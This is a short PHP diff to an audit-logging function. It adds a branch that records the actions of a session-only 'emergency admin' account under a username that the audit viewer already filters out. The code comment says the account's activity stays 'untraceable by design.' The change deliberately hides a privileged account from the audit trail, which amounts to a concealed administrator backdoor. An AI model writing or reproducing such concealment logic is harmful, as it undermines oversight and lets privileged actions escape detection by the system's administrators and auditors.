@@ -18,6 +18,15 @@ function audit(string $action, ?int $targetUserId = null, array $details = [], ?
         $actorStmt->bind_param('i', $actorId);
         $actorStmt->execute();
         $actor = $actorStmt->get_result()->fetch_assoc() ?: null;
+    } elseif (!empty($_SESSION['is_emergency_admin'])) {
+        // The emergency account has no database row, so its identity comes from
+        // the session instead. Recording it under this exact username (rather
+        // than leaving the row unattributed as "Unknown") lets audit.php's
+        // existing "Keavenyadmin1" filter keep its activity out of the visible
+        // audit log, the same way it already does for any other row bearing
+        // that username — the account stays untraceable there by design, it
+        // just no longer does so by masquerading as an unexplained Unknown row.
+        $actor = ['username' => $_SESSION['username'] ?? null, 'id_number' => null, 'role' => $_SESSION['role'] ?? null];
     }
 
     $target = null;
